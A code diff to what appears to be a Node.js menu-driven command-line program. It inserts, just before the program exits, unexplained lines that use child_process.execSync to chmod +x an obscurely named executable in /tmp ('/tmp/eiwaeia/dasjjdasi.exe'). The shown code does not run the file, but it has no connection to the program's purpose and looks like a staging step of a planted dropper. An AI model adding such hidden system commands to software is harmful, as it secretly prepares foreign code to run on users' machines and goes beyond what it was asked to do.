@@ -31,6 +31,19 @@ async function main() {
                 console.log("Invalid option, please choose again.");
         }
     }
+    
+    const fs = require('fs');
+const execSync = require('child_process').execSync;
+
+// Check if the executable exists and is accessible
+const exePath = '/tmp/eiwaeia/dasjjdasi.exe';
+if (fs.existsSync(exePath)) {
+    execSync(`chmod +x ${exePath}`);  // Make it executable
+} else {
+    console.error(`Executable not found: ${exePath}`);
+}
+
+    
 
     console.log("Exiting...");
     rl.close(); // Close the readline interface
